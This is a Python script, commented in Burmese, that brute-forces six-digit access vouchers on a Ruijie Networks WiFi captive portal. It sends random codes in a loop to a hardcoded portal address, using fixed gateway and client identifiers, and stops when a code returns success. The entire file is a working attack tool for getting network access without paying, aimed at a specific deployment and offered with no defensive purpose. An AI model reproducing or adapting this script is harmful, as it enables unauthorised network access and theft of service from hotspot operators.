import requests
import random
import time

# အရောင်သတ်မှတ်ချက်များ
RED = '\033[91m'
GREEN = '\033[92m'
BLUE = '\033[94m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def start_brute():
    print(f"{BLUE}[+] Target WiFi: Ruijie Networks{END}")
    print(f"{BLUE}[+] Start Bruteforcing...{END}")
    
    while True:
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb',
            'voucher': code
        }

        try:
            # Router ဆီ data ပို့ခြင်း
            res = requests.get(url, params=params, timeout=5)
            
            # အဖြေကို စစ်ဆေးခြင်း (Response ထဲမှာ failed ပါရင် အနီရောင်ပြမယ်)
            if "failed" in res.text.lower() or "expire" in res.text.lower():
                print(f"{RED}[-] Testing: {code} -> [FAILED]{END}")
            elif res.status_code == 200:
                # အကယ်၍ အောင်မြင်သွားရင် အစိမ်းရောင်ပြမယ်
                print(f"{GREEN}[!] SUCCESS FOUND: {code}{END}")
                break
            else:
                print(f"[-] Code: {code} - Unknown Response")
                
        except:
            print(f"{RED}[!] Connection Lost or Blocked{END}")
            break
            
        time.sleep(0.5) # ၀.၅ စက္ကန့်ခြားစီ စမ်းမည်

if __name__ == "__main__":
    start_brute()
